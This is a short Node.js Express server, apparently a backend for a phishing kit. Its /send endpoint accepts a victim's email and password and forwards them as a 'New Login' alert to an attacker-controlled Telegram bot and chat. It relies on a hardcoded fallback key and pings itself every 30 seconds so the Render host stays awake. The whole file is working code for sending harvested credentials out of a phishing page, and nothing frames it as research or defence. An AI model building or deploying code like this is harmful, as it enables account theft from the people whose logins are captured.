import express from "express";
import axios from "axios";

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());

// API key - consider using environment variables for security
const API_KEY = process.env.API_KEY || "flash";

// Function to send message to Telegram bot
async function sendToTelegram(botToken, userId, message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: userId,
      text: message,
      parse_mode: "HTML",
    });
    return true;
  } catch (error) {
    console.error("Telegram API error:", error.response?.data || error.message);
    return false;
  }
}

// Function to ping our own server to keep it alive
function startKeepAlive() {
  const baseUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
  
  setInterval(async () => {
    try {
      console.log("Pinging server to keep alive...");
      await axios.get(`${baseUrl}/health`);
      console.log("Keep-alive ping successful");
    } catch (error) {
      console.error("Keep-alive ping failed:", error.message);
    }
  }, 30000); // Ping every 30 seconds
}

// API endpoint
app.post("/send", async (req, res) => {
  const { api_key, bot_token, user_id, email, password } = req.body;

  // Check API key
  if (api_key !== API_KEY) {
    return res.status(403).json({ success: false, error: "Invalid API key" });
  }

  // Validate required fields
  if (!bot_token || !user_id || !email || !password) {
    return res
      .status(400)
      .json({ success: false, error: "Missing required fields" });
  }

  // Create message
  const message = `<b>New Login</b>\n📧 Email: ${email}\n🔑 Password: ${password}`;

  // Send to Telegram
  const sent = await sendToTelegram(bot_token, user_id, message);

  if (!sent) {
    return res
      .status(500)
      .json({ success: false, error: "Failed to send message to Telegram" });
  }

  res.json({ success: true, message: "Message sent to Telegram" });
});

// Health check endpoint for Render and keep-alive
app.get("/health", (req, res) => {
  res.json({ 
    success: true, 
    message: "Server is alive",
    timestamp: new Date().toISOString()
  });
});

// Root endpoint
app.get("/", (req, res) => {
  res.json({ 
    success: true, 
    message: "Telegram API is running",
    usage: "Send a POST request to /send with api_key, bot_token, user_id, email, and password",
    keep_alive: "This server automatically pings itself every 30 seconds to stay alive on Render"
  });
});

// Start server and keep-alive mechanism
app.listen(PORT, () => {
  console.log(`🚀 API running on port ${PORT}`);
  
  // Start keep-alive only in production (on Render)
  if (process.env.NODE_ENV === 'production' || process.env.RENDER) {
    console.log("Starting keep-alive mechanism...");
    startKeepAlive();
  }
});
